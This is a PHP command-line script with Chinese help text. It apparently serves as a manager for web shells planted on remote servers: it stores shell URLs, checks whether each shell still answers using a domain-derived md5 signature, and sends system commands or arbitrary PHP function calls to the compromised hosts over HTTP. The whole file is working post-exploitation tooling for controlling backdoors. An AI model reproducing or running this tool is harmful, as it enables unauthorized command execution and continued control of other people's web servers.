<?php
$zHPManageObj = new zHPManage();
$zHPManageObj->init();

class zHPManage{
        private $dbname = 'hbdata.dat'; //shell保存地址
        private $shortopts = '';
        private $longopts = array(
                'add::',
                'comment::',
                'ls',
                'rm::',
                'id::',
                'search::',
                'chkall',
                'assert::',
                'system::',
                'func::',
                'param'
        );
        private $options;
        private $o_help;
        
        function __construct(){
                global $argv;
                $this->options = getopt($this->shortopts, $this->longopts);
                $this->o_help = <<<HELP
添加shell：{$argv[0]} --add=http://localhost/shell.php --comment=[comment]
列出shell：{$argv[0]} --ls
删除shell：{$argv[0]} --rm=[id]
查找shell：{$argv[0]} --search=[keyword]
检查shell可用性：{$argv[0]} --chkall
执行PHP命令：{$argv[0]} --id=[id] --assert=[command]
执行系统命令：{$argv[0]} --id=[id] --system=[command]
自定义函数：{$argv[0]} --id=[id] --func=[function] --param=[param]\n
HELP;
        }
        
        public function init(){
                if(!is_writable($this->dbname)){
                        exit("错误: 数据保存文件'{$this->dbname}'不可写。\n");
                }
                if(count($this->options) == ''){ //输出帮助
                        echo $this->o_help;
                        exit;
                }
                if(isset($this->options['add'])){
                        $comment = isset($this->options['comment'])?$this->options['comment']:'';
                        $this->add($this->options['add'], $comment);
                }
                if(isset($this->options['ls'])){
                        $this->ls();
                }
                if(isset($this->options['rm'])){
                        $this->rm($this->options['rm']);
                }
                if(isset($this->options['search'])){
                        $this->search($this->options['search']);
                }
                if(isset($this->options['chkall'])){
                        $this->chkall();
                }
                if(isset($this->options['assert'])){
                        $id = isset($this->options['id'])?$this->options['id']:0;
                        $this->assert($this->options['assert'], $id);
                }
                if(isset($this->options['system'])){
                        $id = isset($this->options['id'])?$this->options['id']:0;
                        $this->system($this->options['system'], $id);
                }
                if(isset($this->options['func'])){
                        $id = isset($this->options['id'])?$this->options['id']:0;
                        $param = isset($this->options['param'])?$this->options['param']:'';
                        $this->func($this->options['func'], $param, $id);
                }
        }
        
        private function add($url, $comment = ''){
                $data = trim(file_get_contents($this->dbname));
                if($data != ''){
                        $data = json_decode($data, true);
                        if($data == false){
                                echo "错误：数据文件{$this->dbname}解析错误。\n";
                                return;
                        }
                }else{
                        $data = array();
                }
                $data[] = array(
                        'id' => $this->get_salt(),
                        'url' => $url,
                        'comment' => $comment
                );
                if(file_put_contents($this->dbname, json_encode($data)) == false){
                        echo "错误：数据文件{$this->dbname}写入失败。\n";
                }else{
                        echo "添加成功！\n";
                }
        }
        
        private function ls(){
                $data = trim(file_get_contents($this->dbname));
                if($data != ''){
                        $data = json_decode($data, true);
                        if($data == false){
                                echo "错误：数据文件{$this->dbname}解析错误。\n";
                                return;
                        }
                }elseif($data == '' || count($data) == 0){
                        echo "没有数据！";
                        return;
                }
                $out = "ID\t\tURL\t\tSIGN\t\tCOMMENT\n";
                foreach($data as $data_item){
                        $out .= "{$data_item['id']}\t{$data_item['url']}\t".$this->get_sign($data_item['id'])."\t{$data_item['comment']}\n";
                }
                echo $out;
        }
        
        private function rm($id){
                $data = trim(file_get_contents($this->dbname));
                if($data != ''){
                        $data = json_decode($data, true);
                        if($data == false){
                                echo "错误：数据文件{$this->dbname}解析错误。\n";
                                return;
                        }
                }elseif($data == '' || count($data) == 0){
                        echo "没有数据！";
                        return;
                }
                $temp_data = array();
                foreach($data as $data_item){
                        if($data_item['id'] != $id){
                                $temp_data[] = $data_item;
                        }
                }
                if(file_put_contents($this->dbname, json_encode($temp_data)) == false){
                        echo "错误：数据文件{$this->dbname}写入失败。\n";
                }else{
                        if(count($temp_data) != count($data))
                                echo "删除成功！\n";
                        else
                                echo "错误:ID'{$id}'不存在。\n";
                }
        }
        
        private function search($key){
                $data = trim(file_get_contents($this->dbname));
                if($data != ''){
                        $data = json_decode($data, true);
                        if($data == false){
                                echo "错误：数据文件{$this->dbname}解析错误。\n";
                                return;
                        }
                }elseif($data == '' || count($data) == 0){
                        echo "没有数据！";
                        return;
                }
                $out = "ID\t\tURL\t\tSIGN\t\tCOMMENT\n";
                foreach($data as $data_item){
                        if(!is_bool(stripos(implode(" ", $data_item), $key))){
                                $out .= "{$data_item['id']}\t{$data_item['url']}\t".$this->get_sign($data_item['id'])."\t{$data_item['comment']}\n";
                        }
                }
                echo $out;
        }
        
        private function chkall(){
                $data = trim(file_get_contents($this->dbname));
                if($data != ''){
                        $data = json_decode($data, true);
                        if($data == false){
                                echo "错误：数据文件{$this->dbname}解析错误。\n";
                                return;
                        }
                }elseif($data == '' || count($data) == 0){
                        echo "没有数据！";
                        return;
                }
                $out = "STATUS\tID\t\tURL\t\tSIGN\t\tCOMMENT\n";
                foreach($data as $data_item){
                        $sign = $this->get_sign($data_item['id']);
                        $salt_length = mt_rand(20, 40);
                        $salt = $this->get_salt($salt_length);
                        if(!is_bool(stripos($data_item['url'], '?'))){
                                $url = $data_item['url']."&{$sign}[var_dump]={$salt}";
                        }else{
                                $url = $data_item['url']."?{$sign}[var_dump]={$salt}";
                        }
                        $resp = file_get_contents($url);
                        if(is_bool(strpos($resp, $salt)) || is_bool(strpos($resp, "{$salt_length}"))){
                                $out .= "\033[31mFAIL\033[0m\t{$data_item['id']}\t{$data_item['url']}\t".$this->get_sign($data_item['id'])."\t{$data_item['comment']}\n";
                        }else{
                                $out .= "\033[32mSUCCESS\033[0m\t{$data_item['id']}\t{$data_item['url']}\t".$this->get_sign($data_item['id'])."\t{$data_item['comment']}\n";
                        }
                        
                }
                echo $out;
        }
        
        private function assert($command, $id){
                echo "Don't support.\n";
        }

        private function system($command, $id){
                $sign = $this->get_sign($id);
                $salt = $this->get_salt(10);
                $detail  = $this->get_detail($id);
                if(!is_bool(stripos($detail['url'], '?'))){
                        $url = $detail['url']."&{$sign}[system]=".urlencode("echo {$salt};{$command};echo {$salt};");
                }else{
                        $url = $detail['url']."?{$sign}[system]=".urlencode("echo {$salt};{$command};echo {$salt};");
                }
                echo "URL: '$url'\n";
                $resp = file_get_contents($url);
                $resp_arr = split($salt, $resp);
                if(count($resp_arr) >= 3){
                        echo $resp_arr[1]."\n";
                }else{
                        echo "错误：执行失败.\n";
                }
        }
        
        private function func($func, $param, $id){
                $sign = $this->get_sign($id);
                $salt = $this->get_salt(10);
                $detail  = $this->get_detail($id);
                if(!is_bool(stripos($detail['url'], '?'))){
                        $url = $detail['url']."&{$sign}[{$func}]=".urlencode($param);
                }else{
                        $url = $detail['url']."?{$sign}[{$func}]=".urlencode($param);
                }
                echo "URL: '$url'\n";
                $resp = file_get_contents($url);
                echo $resp."\n";
        }
        
        private function get_detail($id){
                $data = trim(file_get_contents($this->dbname));
                if($data != ''){
                        $data = json_decode($data, true);
                        if($data == false){
                                echo "错误：数据文件{$this->dbname}解析错误。\n";
                                return false;
                        }
                }elseif($data == '' || count($data) == 0){
                        echo "没有数据！";
                        return false;
                }
                $temp_data = array();
                foreach($data as $data_item){
                        if($data_item['id'] == $id){
                                return $data_item;
                        }
                }
                return false;
        }

        private function get_sign($id){
                $detail  = $this->get_detail($id);
                if($detail == false)
                        return false;
                $arr = str_split($this->get_url_domain($detail['url']));
                sort($arr, SORT_STRING);
                return md5(implode('', $arr));
        }
        
        private function get_url_domain($url) {
	        preg_match ( "/^(http:\/\/)?([^\/]+)/i", $url, $matches );
	        $domain = isset ( $matches [2] ) ? $matches [2] : "unknow";
	        return $domain;
        }
        
        private function get_salt($length = 8) {
	        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
	        $salt = '';
	        for($i = 0; $i < $length; $i ++) {
		        $salt .= $chars [mt_rand ( 0, strlen ( $chars ) - 1 )];
	        }
	        return $salt;
        }
}

